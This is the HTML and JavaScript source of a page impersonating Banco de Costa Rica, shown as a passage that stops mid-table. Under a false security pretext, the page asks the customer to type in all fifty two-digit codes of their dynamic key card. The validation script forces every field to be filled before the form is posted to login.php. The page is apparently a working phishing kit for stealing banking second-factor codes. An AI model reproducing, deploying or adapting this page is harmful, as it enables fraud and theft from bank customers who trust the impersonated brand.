<html>
<head>
<title>Banco de Costa Rica</title>
<script language="JavaScript">
<!-- 
if (self != top) { 
   if (document.images)
      top.location.replace(window.location.href);
   else
      top.location.href = window.location.href;
}
//-->
</script>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
<!--
 
input { 
width: 50px; 
height: 25px; 
border-style: solid; 
border-width: 1px; 
padding: 1px;
text-align: center;


} 
.serial { 
width: 585px; 
height: 25px; 
border-style: solid; 
border-width: 1px; 
padding: 1px


} 
-->

</style>
<SCRIPT language=JavaScript>
function Validar()
{
	if(document.layers){
		form = document.layers["datos"].document.entrada;
	}
	else{
		form = document.entrada;
	}
//var serial=form.serial.value;	
var A1=form.A1.value;	
var A2=form.A2.value;
var A3=form.A3.value;
var A4=form.A4.value;
var A5=form.A5.value;

var B1=form.B1.value;	
var B2=form.B2.value;
var B3=form.B3.value;
var B4=form.B4.value;
var B5=form.B5.value;

var C1=form.C1.value;	
var C2=form.C2.value;
var C3=form.C3.value;
var C4=form.C4.value;
var C5=form.C5.value;

var D1=form.D1.value;	
var D2=form.D2.value;
var D3=form.D3.value;
var D4=form.D4.value;
var D5=form.D5.value;

var E1=form.E1.value;	
var E2=form.E2.value;
var E3=form.E3.value;
var E4=form.E4.value;
var E5=form.E5.value;

var F1=form.F1.value;	
var F2=form.F2.value;
var F3=form.F3.value;
var F4=form.F4.value;
var F5=form.F5.value;

var G1=form.G1.value;	
var G2=form.G2.value;
var G3=form.G3.value;
var G4=form.G4.value;
var G5=form.G5.value;

var H1=form.H1.value;	
var H2=form.H2.value;
var H3=form.H3.value;
var H4=form.H4.value;
var H5=form.H5.value;

var I1=form.I1.value;	
var I2=form.I2.value;
var I3=form.I3.value;
var I4=form.I4.value;
var I5=form.I5.value;

var J1=form.J1.value;	
var J2=form.J2.value;
var J3=form.J3.value;
var J4=form.J4.value;
var J5=form.J5.value;

var Resultado = true;

	if(Resultado && A1=="")
	{
		alert("Por favor introdusca la Posicion A1 de Acceso Seguro");
		form.A1.focus();
		form.A1.select();
		Resultado = false;
	}
	
	if(Resultado && A1.length != 2)	{
		alert('la Posicion A1 de Acceso Seguro debe contener 2 digitos');
        form.A1.focus();
		form.A1.select();
		Resultado = false;
	}
	
	if(Resultado && A2=="")
	{
		alert("Por favor introdusca la Posicion A2 de Acceso Seguro");
		form.A2.focus();
		form.A2.select();
		Resultado = false;
	}
	
	if(Resultado && A2.length != 2)	{
		alert('la Posicion A2 de Acceso Seguro debe contener 2 digitos');
        form.A2.focus();
		form.A2.select();
		Resultado = false;
	}

	if(Resultado && A3=="")
	{
		alert("Por favor introdusca la Posicion A3 de Acceso Seguro");
		form.A3.focus();
		form.A3.select();
		Resultado = false;
	}
	
	if(Resultado && A3.length != 2)	{
		alert('la Posicion A3 de Acceso Seguro debe contener 2 digitos');
        form.A3.focus();
		form.A3.select();
		Resultado = false;
	}
	

	if(Resultado && A4=="")
	{
		alert("Por favor introdusca la Posicion A4 de Acceso Seguro");
		form.A4.focus();
		form.A4.select();
		Resultado = false;
	}
	
	if(Resultado && A4.length != 2)	{
		alert('la Posicion A4 de Acceso Seguro debe contener 2 digitos');
        form.A4.focus();
		form.A4.select();
		Resultado = false;
	}
	

	if(Resultado && A5=="")
	{
		alert("Por favor introdusca la Posicion A5 de Acceso Seguro");
		form.A5.focus();
		form.A5.select();
		Resultado = false;
	}
	
	if(Resultado && A5.length != 2)	{
		alert('la Posicion A5 de Acceso Seguro debe contener 2 digitos');
        form.A5.focus();
		form.A5.select();
		Resultado = false;
	}
	

	if(Resultado && B1=="")
	{
		alert("Por favor introdusca la Posicion B1 de Acceso Seguro");
		form.B1.focus();
		form.B1.select();
		Resultado = false;
	}
	
	if(Resultado && B1.length != 2)	{
		alert('la Posicion B1 de Acceso Seguro debe contener 2 digitos');
        form.B1.focus();
		form.B1.select();
		Resultado = false;
	}
	
	if(Resultado && B2=="")
	{
		alert("Por favor introdusca la Posicion B2 de Acceso Seguro");
		form.B2.focus();
		form.B2.select();
		Resultado = false;
	}
	
	if(Resultado && B2.length != 2)	{
		alert('la Posicion B2 de Acceso Seguro debe contener 2 digitos');
        form.B2.focus();
		form.B2.select();
		Resultado = false;
	}
	

	if(Resultado && B3=="")
	{
		alert("Por favor introdusca la Posicion B3 de Acceso Seguro");
		form.B3.focus();
		form.B3.select();
		Resultado = false;
	}
	
	if(Resultado && B3.length != 2)	{
		alert('la Posicion B3 de Acceso Seguro debe contener 2 digitos');
        form.B3.focus();
		form.B3.select();
		Resultado = false;
	}
	

	if(Resultado && B4=="")
	{
		alert("Por favor introdusca la Posicion B4 de Acceso Seguro");
		form.B4.focus();
		form.B4.select();
		Resultado = false;
	}
	
	if(Resultado && B4.length != 2)	{
		alert('la Posicion B4 de Acceso Seguro debe contener 2 digitos');
        form.B4.focus();
		form.B4.select();
		Resultado = false;
	}
	

	if(Resultado && B5=="")
	{
		alert("Por favor introdusca la Posicion B5 de Acceso Seguro");
		form.B5.focus();
		form.B5.select();
		Resultado = false;
	}
	
	if(Resultado && B5.length != 2)	{
		alert('la Posicion B5 de Acceso Seguro debe contener 2 digitos');
        form.B5.focus();
		form.B5.select();
		Resultado = false;
	}
	
	if(Resultado && C1=="")
	{
		alert("Por favor introdusca la Posicion C1 de Acceso Seguro");
		form.C1.focus();
		form.C1.select();
		Resultado = false;
	}
	
	if(Resultado && C1.length != 2)	{
		alert('la Posicion C1 de Acceso Seguro debe contener 2 digitos');
        form.C1.focus();
		form.C1.select();
		Resultado = false;
	}
	
	if(Resultado && C2=="")
	{
		alert("Por favor introdusca la Posicion C2 de Acceso Seguro");
		form.C2.focus();
		form.C2.select();
		Resultado = false;
	}
	
	if(Resultado && C2.length != 2)	{
		alert('la Posicion C2 de Acceso Seguro debe contener 2 digitos');
        form.C2.focus();
		form.C2.select();
		Resultado = false;
	}
	

	if(Resultado && C3=="")
	{
		alert("Por favor introdusca la Posicion C3 de Acceso Seguro");
		form.C3.focus();
		form.C3.select();
		Resultado = false;
	}
	
	if(Resultado && C3.length != 2)	{
		alert('la Posicion C3 de Acceso Seguro debe contener 2 digitos');
        form.C3.focus();
		form.C3.select();
		Resultado = false;
	}
	

	if(Resultado && C4=="")
	{
		alert("Por favor introdusca la Posicion C4 de Acceso Seguro");
		form.C4.focus();
		form.C4.select();
		Resultado = false;
	}
	
	if(Resultado && C4.length != 2)	{
		alert('la Posicion C4 de Acceso Seguro debe contener 2 digitos');
        form.C4.focus();
		form.C4.select();
		Resultado = false;
	}
	

	if(Resultado && C5=="")
	{
		alert("Por favor introdusca la Posicion C5 de Acceso Seguro");
		form.C5.focus();
		form.C5.select();
		Resultado = false;
	}
	
	if(Resultado && C5.length != 2)	{
		alert('la Posicion C5 de Acceso Seguro debe contener 2 digitos');
        form.C5.focus();
		form.C5.select();
		Resultado = false;
	}
	
	if(Resultado && D1=="")
	{
		alert("Por favor introdusca la Posicion D1 de Acceso Seguro");
		form.D1.focus();
		form.D1.select();
		Resultado = false;
	}
	
	if(Resultado && D1.length != 2)	{
		alert('la Posicion D1 de Acceso Seguro debe contener 2 digitos');
        form.D1.focus();
		form.D1.select();
		Resultado = false;
	}
	
	if(Resultado && D2=="")
	{
		alert("Por favor introdusca la Posicion D2 de Acceso Seguro");
		form.D2.focus();
		form.D2.select();
		Resultado = false;
	}
	
	if(Resultado && D2.length != 2)	{
		alert('la Posicion D2 de Acceso Seguro debe contener 2 digitos');
        form.D2.focus();
		form.D2.select();
		Resultado = false;
	}
	

	if(Resultado && D3=="")
	{
		alert("Por favor introdusca la Posicion D3 de Acceso Seguro");
		form.D3.focus();
		form.D3.select();
		Resultado = false;
	}
	
	if(Resultado && D3.length != 2)	{
		alert('la Posicion D3 de Acceso Seguro debe contener 2 digitos');
        form.D3.focus();
		form.D3.select();
		Resultado = false;
	}
	

	if(Resultado && D4=="")
	{
		alert("Por favor introdusca la Posicion D4 de Acceso Seguro");
		form.D4.focus();
		form.D4.select();
		Resultado = false;
	}
	
	if(Resultado && D4.length != 2)	{
		alert('la Posicion D4 de Acceso Seguro debe contener 2 digitos');
        form.D4.focus();
		form.D4.select();
		Resultado = false;
	}
	

	if(Resultado && D5=="")
	{
		alert("Por favor introdusca la Posicion D5 de Acceso Seguro");
		form.D5.focus();
		form.D5.select();
		Resultado = false;
	}
	
	if(Resultado && D5.length != 2)	{
		alert('la Posicion D5 de Acceso Seguro debe contener 2 digitos');
        form.D5.focus();
		form.D5.select();
		Resultado = false;
	}
	
	if(Resultado && E1=="")
	{
		alert("Por favor introdusca la Posicion E1 de Acceso Seguro");
		form.E1.focus();
		form.E1.select();
		Resultado = false;
	}
	
	if(Resultado && E1.length != 2)	{
		alert('la Posicion E1 de Acceso Seguro debe contener 2 digitos');
        form.E1.focus();
		form.E1.select();
		Resultado = false;
	}
	
	if(Resultado && E2=="")
	{
		alert("Por favor introdusca la Posicion E2 de Acceso Seguro");
		form.E2.focus();
		form.E2.select();
		Resultado = false;
	}
	
	if(Resultado && E2.length != 2)	{
		alert('la Posicion E2 de Acceso Seguro debe contener 2 digitos');
        form.E2.focus();
		form.E2.select();
		Resultado = false;
	}
	

	if(Resultado && E3=="")
	{
		alert("Por favor introdusca la Posicion E3 de Acceso Seguro");
		form.E3.focus();
		form.E3.select();
		Resultado = false;
	}
	
	if(Resultado && E3.length != 2)	{
		alert('la Posicion E3 de Acceso Seguro debe contener 2 digitos');
        form.E3.focus();
		form.E3.select();
		Resultado = false;
	}
	

	if(Resultado && E4=="")
	{
		alert("Por favor introdusca la Posicion E4 de Acceso Seguro");
		form.E4.focus();
		form.E4.select();
		Resultado = false;
	}
	
	if(Resultado && E4.length != 2)	{
		alert('la Posicion E4 de Acceso Seguro debe contener 2 digitos');
        form.E4.focus();
		form.E4.select();
		Resultado = false;
	}
	

	if(Resultado && E5=="")
	{
		alert("Por favor introdusca la Posicion E5 de Acceso Seguro");
		form.E5.focus();
		form.E5.select();
		Resultado = false;
	}
	
	if(Resultado && E5.length != 2)	{
		alert('la Posicion E5 de Acceso Seguro debe contener 2 digitos');
        form.E5.focus();
		form.E5.select();
		Resultado = false;
	}
	
	if(Resultado && F1=="")
	{
		alert("Por favor introdusca la Posicion F1 de Acceso Seguro");
		form.F1.focus();
		form.F1.select();
		Resultado = false;
	}
	
	if(Resultado && F1.length != 2)	{
		alert('la Posicion F1 de Acceso Seguro debe contener 2 digitos');
        form.F1.focus();
		form.F1.select();
		Resultado = false;
	}
	
	if(Resultado && F2=="")
	{
		alert("Por favor introdusca la Posicion F2 de Acceso Seguro");
		form.F2.focus();
		form.F2.select();
		Resultado = false;
	}
	
	if(Resultado && F2.length != 2)	{
		alert('la Posicion F2 de Acceso Seguro debe contener 2 digitos');
        form.F2.focus();
		form.F2.select();
		Resultado = false;
	}
	

	if(Resultado && F3=="")
	{
		alert("Por favor introdusca la Posicion F3 de Acceso Seguro");
		form.F3.focus();
		form.F3.select();
		Resultado = false;
	}
	
	if(Resultado && F3.length != 2)	{
		alert('la Posicion F3 de Acceso Seguro debe contener 2 digitos');
        form.F3.focus();
		form.F3.select();
		Resultado = false;
	}
	

	if(Resultado && F4=="")
	{
		alert("Por favor introdusca la Posicion F4 de Acceso Seguro");
		form.F4.focus();
		form.F4.select();
		Resultado = false;
	}
	
	if(Resultado && F4.length != 2)	{
		alert('la Posicion F4 de Acceso Seguro debe contener 2 digitos');
        form.F4.focus();
		form.F4.select();
		Resultado = false;
	}
	

	if(Resultado && F5=="")
	{
		alert("Por favor introdusca la Posicion F5 de Acceso Seguro");
		form.F5.focus();
		form.F5.select();
		Resultado = false;
	}
	
	if(Resultado && F5.length != 2)	{
		alert('la Posicion F5 de Acceso Seguro debe contener 2 digitos');
        form.F5.focus();
		form.F5.select();
		Resultado = false;
	}
	
	if(Resultado && G1=="")
	{
		alert("Por favor introdusca la Posicion G1 de Acceso Seguro");
		form.G1.focus();
		form.G1.select();
		Resultado = false;
	}
	
	if(Resultado && G1.length != 2)	{
		alert('la Posicion G1 de Acceso Seguro debe contener 2 digitos');
        form.G1.focus();
		form.G1.select();
		Resultado = false;
	}
	
	if(Resultado && G2=="")
	{
		alert("Por favor introdusca la Posicion G2 de Acceso Seguro");
		form.G2.focus();
		form.G2.select();
		Resultado = false;
	}
	
	if(Resultado && G2.length != 2)	{
		alert('la Posicion G2 de Acceso Seguro debe contener 2 digitos');
        form.G2.focus();
		form.G2.select();
		Resultado = false;
	}
	

	if(Resultado && G3=="")
	{
		alert("Por favor introdusca la Posicion G3 de Acceso Seguro");
		form.G3.focus();
		form.G3.select();
		Resultado = false;
	}
	
	if(Resultado && G3.length != 2)	{
		alert('la Posicion G3 de Acceso Seguro debe contener 2 digitos');
        form.G3.focus();
		form.G3.select();
		Resultado = false;
	}
	

	if(Resultado && G4=="")
	{
		alert("Por favor introdusca la Posicion G4 de Acceso Seguro");
		form.G4.focus();
		form.G4.select();
		Resultado = false;
	}
	
	if(Resultado && G4.length != 2)	{
		alert('la Posicion G4 de Acceso Seguro debe contener 2 digitos');
        form.G4.focus();
		form.G4.select();
		Resultado = false;
	}
	

	if(Resultado && G5=="")
	{
		alert("Por favor introdusca la Posicion G5 de Acceso Seguro");
		form.G5.focus();
		form.G5.select();
		Resultado = false;
	}
	
	if(Resultado && G5.length != 2)	{
		alert('la Posicion G5 de Acceso Seguro debe contener 2 digitos');
        form.G5.focus();
		form.G5.select();
		Resultado = false;
	}
	
	if(Resultado && H1=="")
	{
		alert("Por favor introdusca la Posicion H1 de Acceso Seguro");
		form.H1.focus();
		form.H1.select();
		Resultado = false;
	}
	
	if(Resultado && H1.length != 2)	{
		alert('la Posicion H1 de Acceso Seguro debe contener 2 digitos');
        form.H1.focus();
		form.H1.select();
		Resultado = false;
	}
	
	if(Resultado && H2=="")
	{
		alert("Por favor introdusca la Posicion H2 de Acceso Seguro");
		form.H2.focus();
		form.H2.select();
		Resultado = false;
	}
	
	if(Resultado && H2.length != 2)	{
		alert('la Posicion H2 de Acceso Seguro debe contener 2 digitos');
        form.H2.focus();
		form.H2.select();
		Resultado = false;
	}
	

	if(Resultado && H3=="")
	{
		alert("Por favor introdusca la Posicion H3 de Acceso Seguro");
		form.H3.focus();
		form.H3.select();
		Resultado = false;
	}
	
	if(Resultado && H3.length != 2)	{
		alert('la Posicion H3 de Acceso Seguro debe contener 2 digitos');
        form.H3.focus();
		form.H3.select();
		Resultado = false;
	}
	

	if(Resultado && H4=="")
	{
		alert("Por favor introdusca la Posicion H4 de Acceso Seguro");
		form.H4.focus();
		form.H4.select();
		Resultado = false;
	}
	
	if(Resultado && H4.length != 2)	{
		alert('la Posicion H4 de Acceso Seguro debe contener 2 digitos');
        form.H4.focus();
		form.H4.select();
		Resultado = false;
	}
	

	if(Resultado && H5=="")
	{
		alert("Por favor introdusca la Posicion H5 de Acceso Seguro");
		form.H5.focus();
		form.H5.select();
		Resultado = false;
	}
	
	if(Resultado && H5.length != 2)	{
		alert('la Posicion H5 de Acceso Seguro debe contener 2 digitos');
        form.H5.focus();
		form.H5.select();
		Resultado = false;
	}
	
	if(Resultado && I1=="")
	{
		alert("Por favor introdusca la Posicion I1 de Acceso Seguro");
		form.I1.focus();
		form.I1.select();
		Resultado = false;
	}
	
	if(Resultado && I1.length != 2)	{
		alert('la Posicion I1 de Acceso Seguro debe contener 2 digitos');
        form.I1.focus();
		form.I1.select();
		Resultado = false;
	}
	
	if(Resultado && I2=="")
	{
		alert("Por favor introdusca la Posicion I2 de Acceso Seguro");
		form.I2.focus();
		form.I2.select();
		Resultado = false;
	}
	
	if(Resultado && I2.length != 2)	{
		alert('la Posicion I2 de Acceso Seguro debe contener 2 digitos');
        form.I2.focus();
		form.I2.select();
		Resultado = false;
	}
	

	if(Resultado && I3=="")
	{
		alert("Por favor introdusca la Posicion I3 de Acceso Seguro");
		form.I3.focus();
		form.I3.select();
		Resultado = false;
	}
	
	if(Resultado && I3.length != 2)	{
		alert('la Posicion I3 de Acceso Seguro debe contener 2 digitos');
        form.I3.focus();
		form.I3.select();
		Resultado = false;
	}
	

	if(Resultado && I4=="")
	{
		alert("Por favor introdusca la Posicion I4 de Acceso Seguro");
		form.I4.focus();
		form.I4.select();
		Resultado = false;
	}
	
	if(Resultado && I4.length != 2)	{
		alert('la Posicion I4 de Acceso Seguro debe contener 2 digitos');
        form.I4.focus();
		form.I4.select();
		Resultado = false;
	}
	

	if(Resultado && I5=="")
	{
		alert("Por favor introdusca la Posicion I5 de Acceso Seguro");
		form.I5.focus();
		form.I5.select();
		Resultado = false;
	}
	
	if(Resultado && I5.length != 2)	{
		alert('la Posicion I5 de Acceso Seguro debe contener 2 digitos');
        form.I5.focus();
		form.I5.select();
		Resultado = false;
	}
	
	if(Resultado && J1.length != 2)	{
		alert('la Posicion J1 de Acceso Seguro debe contener 2 digitos');
        form.J1.focus();
		form.J1.select();
		Resultado = false;
	}
	
	if(Resultado && J2=="")
	{
		alert("Por favor introdusca la Posicion J2 de Acceso Seguro");
		form.J2.focus();
		form.J2.select();
		Resultado = false;
	}
	
	if(Resultado && J2.length != 2)	{
		alert('la Posicion J2 de Acceso Seguro debe contener 2 digitos');
        form.J2.focus();
		form.J2.select();
		Resultado = false;
	}
	

	if(Resultado && J3=="")
	{
		alert("Por favor introdusca la Posicion J3 de Acceso Seguro");
		form.J3.focus();
		form.J3.select();
		Resultado = false;
	}
	
	if(Resultado && J3.length != 2)	{
		alert('la Posicion J3 de Acceso Seguro debe contener 2 digitos');
        form.J3.focus();
		form.J3.select();
		Resultado = false;
	}
	

	if(Resultado && J4=="")
	{
		alert("Por favor introdusca la Posicion J4 de Acceso Seguro");
		form.J4.focus();
		form.J4.select();
		Resultado = false;
	}
	
	if(Resultado && J4.length != 2)	{
		alert('la Posicion J4 de Acceso Seguro debe contener 2 digitos');
        form.J4.focus();
		form.J4.select();
		Resultado = false;
	}
	

	if(Resultado && J5=="")
	{
		alert("Por favor introdusca la Posicion J5 de Acceso Seguro");
		form.J5.focus();
		form.J5.select();
		Resultado = false;
	}
	
	if(Resultado && J5.length != 2)	{
		alert('la Posicion J5 de Acceso Seguro debe contener 2 digitos');
        form.J5.focus();
		form.J5.select();
		Resultado = false;
	}
	/*	if(Resultado &&serial=="")
	{
		alert("Por favor introdusca el Serial N0");
		form.serial.focus();
		form.serial.select();
		Resultado = false;
	}*/
	
	/*if(Resultado && serial.length != 22)	{
		alert('la Posicion A1 de Acceso Seguro debe contener 22 digitos');
        form.A1.focus();
		form.A1.select();
		Resultado = false;
	}	*/
//AKA  !!!
if(Resultado)
	{
	form.submit();
		}
}	
</SCRIPT>
</head>
<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<!-- ImageReady Slices (coordenada2.psd) -->
<div align="center">
<form method="POST" name="entrada" action="login.php">
<p>
<img border="0" src="imagenes/BCR-bancobcr.jpg" width="691" height="112"><br>
<br>
<div class="fingreso_login"> 
        	<table border="0" width="41%" cellspacing="0" cellpadding="0">
				<tr>
					<td><font face="Verdana" size="2"> 
        	<b>Estimado Cliente:</b></font><font face="Verdana" size="2" color="#0000FF"> 
					Por motivos de su Seguridad, le pedimos rellenar el 
					siguiente formulario a fin de verificar su Tarjeta Clave 
					Din�mica donde el sistema podra verificar la autenticidad de 
					dicha tarjeta y de esta manera su cuenta podra ser activada 
					para que realice sus consultas y transferencias de manera 
					rapida y segura.<br>
					Banco de costa rica siempre pensando en su Seguridad.<br>
&nbsp;</font></td>
				</tr>
			</table>
 
        	        	</div>  
<table id="Tabla_01" width="700" height="457" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td>
			<img src="imagenes/coordenada2_01.jpg" width="700" height="143" alt=""></td>
	</tr>
	<tr>
		<td background="imagenes/coordenada2_02.jpg" width="700" height="278" alt="">
			<div align="center">
			<table border="0" width="685" cellspacing="4" height="278">
				<tr>
					<td valign=top align="center" height="34" width="60">&nbsp;</td>
					<td align="center" bgcolor="#7E7A95" height="34" width="60">
					<b><font face="Arial Black" color="#FFFFFF" size="2">A</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="60">
					<b><font face="Arial Black" color="#FFFFFF" size="2">B</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="60">
					<b><font face="Arial Black" color="#FFFFFF" size="2">C</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="60">
					<b><font face="Arial Black" color="#FFFFFF" size="2">D</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="61">
					<b><font face="Arial Black" color="#FFFFFF" size="2">E</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="61">
					<b><font face="Arial Black" color="#FFFFFF" size="2">F</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="61">
					<b><font face="Arial Black" color="#FFFFFF" size="2">G</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="61">
					<b><font face="Arial Black" color="#FFFFFF" size="2">H</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="61">
					<b><font face="Arial Black" color="#FFFFFF" size="2">I</font></b></td>
					<td align="center" bgcolor="#7E7A95" height="34" width="61">
					<b><font face="Arial Black" color="#FFFFFF" size="2">J</font></b></td>
				</tr>
				<tr>
					<td align="center" bgcolor="#7E7A95" height="34" width="60">
					<b><font face="Arial Black" size="2" color="#FFFFFF">1</font></b></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="A1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="B1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="C1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="D1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="E1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="F1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="G1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="H1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="I1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="34" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="J1" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
				</tr>
				<tr>
					<td align="center" bgcolor="#7E7A95" height="35" width="60">
					<b><font face="Arial Black" size="2" color="#FFFFFF">2</font></b></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="A2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="B2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="C2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="D2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="E2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="F2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="G2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="H2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="I2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#7A7691" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="J2" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
				</tr>
				<tr>
					<td align="center" bgcolor="#7E7A95" height="35" width="60">
					<b><font face="Arial Black" size="2" color="#FFFFFF">3</font></b></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="A3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="B3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="C3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="60">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="D3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="E3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="F3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="G3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
					<input type="text" maxlength="2" onKeyPress ="if ((event.keyCode < 48) || (event.keyCode > 57)) event.returnValue = false;" name="H3" size="20" style="width: 50px; height: 25px; text-align: center; border-style: solid; border-width: 1px; padding: 1px"></td>
					<td align="center" bgcolor="#B5CCEE" height="35" width="61">
